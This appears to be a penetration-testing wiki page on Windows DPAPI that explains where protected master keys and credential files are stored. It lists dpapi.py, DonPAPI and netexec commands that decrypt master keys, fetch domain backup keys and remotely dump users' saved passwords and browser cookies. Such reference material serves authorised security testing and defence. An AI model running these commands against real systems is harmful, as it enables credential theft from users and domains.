## Theory
The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```
Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.
Common paths of hidden files that usually contain DPAPI-protected data:
```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```
## DPAPI dumping
=== "UNIX-like"
    From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like Impacket's [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py) and secretsdump.py (Python) or [donpapi](https://github.com/login-securite/DonPAPI).
    ```bash
    # (not tested) Decrypt a master key
    dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

    # (not tested) Obtain the backup keys & use it to decrypt a master key
    dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
    dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

    # (not tested) Decrypt DPAPI-protected data using a master key
    dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
    ```
    DonPAPI (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports pass-the-hash, pass-the-ticket and so on.
    ```bash
    DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
    ```
    Or it can be done with netexec
    ```bash
    nxc smb <ip> -u user -p password --dpapi
    nxc smb <ip> -u user -p password --dpapi cookies
    nxc smb <ip> -u user -p password --dpapi nosystem
    nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
    ```
    !!! note
        need at least local admin privilege on the remote target, use **--local-auth** if your user is a local account